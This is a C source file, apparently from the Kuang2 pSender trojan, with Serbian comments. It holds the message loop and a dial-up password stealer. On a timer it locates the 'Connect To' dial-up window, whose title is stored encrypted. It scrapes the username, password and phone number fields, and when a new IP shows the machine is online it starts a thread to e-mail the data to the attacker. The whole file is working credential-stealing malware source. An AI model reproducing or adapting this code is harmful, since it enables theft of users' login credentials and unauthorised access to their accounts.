/***[ThuNderSoft]*************************************************************
						  KUANG2 pSender: message loop
								���� WEIRD ����
*****************************************************************************/

#include <windows.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

// ovo je max du�ina stringa za svaki od unosa
#define MAXSTR 1024

// broj milisekundi izme�u dva ulaska u DUPhook (5000)
#define TIME 5000
// odre�uje posle koliko ulazaka u DUPhook poziva deo koji radi sa mre�om (12000)
#define NETTIME 12


HWND hWnd;
volatile BOOL unutra;

extern void (*InstallHook) (void);
extern void (*UnHook) (void);

char buff[5120];
char temp[1024];

char connect_to[]={		// "Connect To";
	0x34, 0xF6, 0xE6, 0xE6, 0x56, 0x36, 0x47, 0x02, 0x45, 0xF6, 0x00};


int brojac, time4Net;
char lastIP[]="a3d$Sp 32p dpcl"; // zadnji IP
char tempIP[]="dm__eodU#�dsWQw"; // temp IP (teku�i)
char hostIP[]="127.0.0.1";       // host IP
char newlines[]={0x0D, 0x0A, 0x0D, 0x0A, 0x00}; // 2 nove linije

BOOL SENDdunOK;		// TRUE ako smo nakon priklju�enja na internet uspe�no obradili slanje DUN podataka
BOOL SENDpassOK;	// TRUE ako smo nakon priklju�enja na internet uspe�no obradili slanje PASSWORD podataka


extern DWORD WINAPI SendThread (LPVOID param);

/*
	FindCnctName
	------------
  � Za dati "Connect To" nalazi ime konekcije i ostalo. */

BOOL CALLBACK FindCnctName(HWND hChild, LPARAM lParam)
{
	switch (brojac) {
		case 5:		// Username
			SendMessage(hChild, WM_GETTEXT, MAXSTR, (LPARAM) temp);
			strcopyFaddd(buff, temp, 0x0A0D);
			break;
		case 7:		// Password
			SendMessage(hChild, WM_GETTEXT, MAXSTR, (LPARAM) temp);
			straddFaddd(buff, temp, 0x0A0D);
			break;
		case 12:	// Tel
			SendMessage(hChild, WM_GETTEXT, MAXSTR, (LPARAM) temp);
			straddF(buff, temp);
			straddF(buff, newlines);
			return FALSE;
	}
	brojac++;
	return TRUE;
}

/*
	DupHook
	-------
  � Ovde je glavna radnja: prati DUP prozore i �ita podatke i tako to.
  � Dolazi ovde svakih TIME milisekundi - to je minimalno vreme koje mora da
	protekne izme�u poziva 'Connect To' prozora i kona�nog logovanja na
	mre�u. Ovo je sasvim dovoljno vreme, �ak mo�e i vi�e da se uzme.
  � �ta se de�ava ako korisnik ima neki alternativni na�in logovanja?
	Ako prethodno nije koristio 'Connect To' buf[0] bi trebalo da bude 0
	i situacija se bele�i i �alje se IP. Ako je prethodno nekad bio
	'Connect To' onda su ti podaci i dalje prisutni ali, po�to su obra�eni
	nema frke da �e ih slati ponovo */

void DUPhook(void)
{
	HWND hCT;			// handle na 'Connect To'
	struct hostent *H;
	DWORD threadID;


	unutra=TRUE;		// ozna�i da smo unutra, da ne bi ponovo u�li

/******************************* WatchDog mode ******************************/

	hCT=FindWindow(NULL, connect_to);	// FindWindows je MNOGO br�e nego EnumWindows (� 2x br�e)
	if (hCT) {
		time4Net=brojac=0;
		EnumChildWindows(hCT, FindCnctName, 1); // enumeri�i - dok ne zavr�i� nema dalje
	}

/********************************* NetDetect ********************************/

	if (time4Net++ >= NETTIME) {// Da li je do�lo vreme da se proverava mre�a?
		time4Net=0;				// da, resetuj brojac

		if (gethostname(temp, 1024))	// uzmi ime hosta
			goto dhend_err;				// ne�to nije bilo u redu

		H=gethostbyname(temp);			// na�i IP hosta
		if (H==NULL) goto dhend_err;	// nema IPa - verovatno nismo na mre�i

		strcopyF(tempIP, inet_ntoa(*(struct in_addr *)H->h_addr));	// na�li smo IP

		if (!strcompF(tempIP, hostIP))
			goto dhend_err;				// sigurno nismo na mre�i jer su isti

/****************************** I am on the Net *****************************/

		if (!strcompF(tempIP, lastIP)) goto dhend;	// trenutni IP je isti kao i zapam�eni -> iza�i

		// Sada smo na mre�i po prvi put nakon uklju�enja na nju! Zato
		// kreiram thread da oslobodim sam program koji proverava da li je
		// ova konekcija bila i ako nije da po�alje podatke na e-mail.

		// Kreiramo thread zadu�en za slanje podataka.
		CreateThread(NULL, 0, SendThread, NULL, 0, &threadID);

		return;						// samo iza�i - 'unutra' ostaje TRUE!

dhend_err:
		SENDdunOK=SENDpassOK=FALSE;		// neka gre�ka je bila ili nismo na netu
		lastIP[0]=0;					// zato resetuj sve flagove
	}
dhend:
	unutra=FALSE;					// nismo vi�e unutra
	return;
}



/*
	WndProc
	-------
  � message loop */

LRESULT CALLBACK WndProc (HWND hw, unsigned msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {

		case WM_CREATE:
//MsgBox("You are working under KUANG2 pSender FULL *TEST* version");
			hWnd = hw;
			unutra=FALSE;								// nismo unutra
			buff[0]=temp[0]=lastIP[0]=time4Net=0;		// resetuj sve
			SENDdunOK=SENDpassOK=FALSE;					// resetuj i ove flagove
			strdecryptS(connect_to);					// dekriptuj
			SetTimer(hWnd, 1, TIME, NULL);				// postavi tajmer
			if (InstallHook) (*InstallHook)();			// pokreni hook
			break;

		case WM_TIMER:
			if (!unutra)			// ako nismo ve� unutra
				DUPhook();			// pozovi f-ju koja radi...
//			else MessageBeep(MB_OK);
			break;

		case WM_DESTROY:
			if (UnHook) (*UnHook)();
			KillTimer(hWnd, 1);
			PostQuitMessage(0);		// kraj ???
			break;

		default:
			return (DefWindowProc(hw, msg, wParam, lParam));
	}
	return 0;
}
